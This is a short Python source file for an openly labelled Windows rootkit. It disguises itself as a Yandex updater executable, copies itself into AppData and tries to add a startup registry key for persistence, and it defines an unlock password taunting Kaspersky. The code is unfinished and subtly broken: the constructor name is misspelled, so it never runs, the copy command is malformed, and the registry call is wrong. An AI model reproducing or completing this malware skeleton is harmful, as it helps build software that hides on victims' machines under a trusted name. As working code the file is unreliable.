import hashlib
import os
import subprocess
import psutil
import ctypes
import sys
import tkinter
import keyboard
import winreg

from pathlib import Path as PLPath

UNLOCK_PASSWORD = "Fuck, you Kaspersky!"
UNLOCK_HASH = hashlib.sha256(UNLOCK_PASSWORD.encode()).hexdigest()
WINREG_BRANCH = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
WINREG_DWORD = "YandexAutoUpdateLauncher"
MASK_FILE = "YandexUpdater.exe"

try:
    APPDATA_PATH = PLPath("%APPDATA%", "Microsoft")
except:
    print("NOT NT")


class RootKit:
    def __int__(self):
        """
        Init malware code
        :return:
        """

        if not self._check_installer():
            self.install_system()
        else:
            self.fix_windows_wp()

    def _check_installer(self):
        return False

    def install_system(self):
        CURRENT_DIR = PLPath.cwd()
        try:
            os.system(f"COPY{CURRENT_DIR}\\{MASK_FILE} {APPDATA_PATH}\\{MASK_FILE}")
            winreg.CreateKey(f"{WINREG_BRANCH}")
        except:
            pass

        try:
            self.fix_windows_wp()
        except:
            pass

    def fix_windows_wp(self):
        # TODO : Kill WallpaperEngine wlpaper64
        pass


if __name__ == "__main__":
    rootkit = RootKit()
